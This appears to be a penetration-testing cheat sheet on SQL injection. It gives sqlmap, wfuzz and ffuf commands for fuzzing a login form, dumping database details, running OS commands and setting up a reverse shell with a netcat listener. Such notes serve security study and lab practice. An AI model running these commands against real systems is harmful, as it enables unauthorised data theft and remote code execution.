# SQL Injection

## Questions to ask yourself
  *  What inputs of the web application are likely to be part of a query?
  *  Do any behaviors of the web app imply DBMS function calls?

## Things to remember
  *  Injection syntax depends on the DBMS under the hood: **Google everything**
      *  Error outputs can reveal **A LOT** about the underlying DBMS
  *  [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) for various SQL injection techniques
  *  Watch for filters such as case-sensitivity, whitespace removal, blacklists, etc.

## Useful tools
  *  [`sqlmap`](https://sqlmap.org/) for various SQLi interactions
  *  [`wfuzz`](https://www.kali.org/tools/wfuzz/) and [`ffuf`](https://github.com/ffuf/ffuf) for manually fuzzing web app inputs for SQLi

## Fuzzing for SQL injection
  *  `sqlmap` is the go-to for SQLi fuzzing
      *  Specify files containing request text for HTTP POST fuzzing
      *  Crawl form data to automatically generate HTTP POST fuzz
      *  See [`hacktricks`](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap) page for more precise options
  *  `wfuzz` and `ffuf` for applying lists of SQLi techniques
      *  Consider applying HTTP headers/POST data matching inital browsing requests
      *  `ffuf` can parse requests from text files, easy to handle more complex POST requests

```
sqlmap -u 'http://10.0.0.1/login'
sqlmap -r http-post-request.txt
sqlmap -u http://10.0.0.1/login --forms -p username --not-string incorrect --batch
```

```
wfuzz -w /path/to/sqli.txt 'http://10.0.0.1/login?username=FUZZ&password=test'
wfuzz -w /path/to/sqli.txt -d 'username=FUZZ&password=test' 'http://10.0.0.1/login'
```

```
ffuf -request req.txt --request-proto http -w /path/to/sqli.txt -v
```

## Automated DB dumping
  *  `sqlmap` for automatically dumping data from vulnerable applications

```
sqlmap -r http-post-request.txt --current-db
sqlmap -u 'http://10.0.0.1/login' --current-user
sqlmap -u 'http://10.0.0.1/login' -D exampleDB --tables
```

## Automated code execution
  *  `sqlmap` for automatically attempting code execution via SQLi
      *  Extended help page `-hh` for detailed OS access options
  *  Headless/batch options for code exec one-liners

```
sqlmap -u 'http://10.0.0.1/login' --os-cmd='cmd /c calc.exe'
sqlmap -r http-post-request.txt --os-cmd='[POWERSHELL BASE64 REVERSE SHELL]' --answers='follow=Y' --batch > /dev/null & nc -nvlp 80
```
